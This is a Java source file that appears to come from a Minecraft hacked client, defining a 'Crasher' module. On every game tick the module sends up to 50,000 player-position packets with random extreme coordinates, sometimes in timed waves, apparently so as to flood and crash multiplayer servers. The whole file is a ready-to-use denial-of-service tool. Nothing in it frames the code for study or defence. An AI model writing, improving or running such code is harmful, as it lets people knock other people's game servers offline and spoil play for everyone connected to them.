package neko.module.modules.misc;

import neko.module.Category;
import neko.module.Module;
import neko.utils.Utils;
import net.minecraft.network.play.client.C03PacketPlayer;

public class Crasher extends Module {
	private static Crasher instance;
	private int delay = 0;
	private boolean wave = false;
	
	public Crasher() {
		super("Crasher", -1, Category.MISC, false);
		this.instance = this;
	}
	
	public void onEnabled() {		
		super.onEnabled();
	}
	
	public void onDisabled() {
		super.onDisabled();
	}	

	public void setValues() {
		this.values = "";
	}
	
	public void onUpdate() {
		if (this.wave) this.delay++;
		if (this.delay >= 200) this.delay = 0;
		
		int spam = 0;
		while (spam < 50000 && (this.wave ? this.delay <= 100 : true)) {
			mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*1000000-5000000), (Math.random()*100+10), (Math.random()*1000000-5000000), true));
			++spam;
		}
		super.onUpdate();
	}

	public static Crasher getInstance() {
		return instance;
	}

	public boolean isWave() {
		return wave;
	}

	public void setWave(boolean wave) {
		this.wave = wave;
	}
	
}
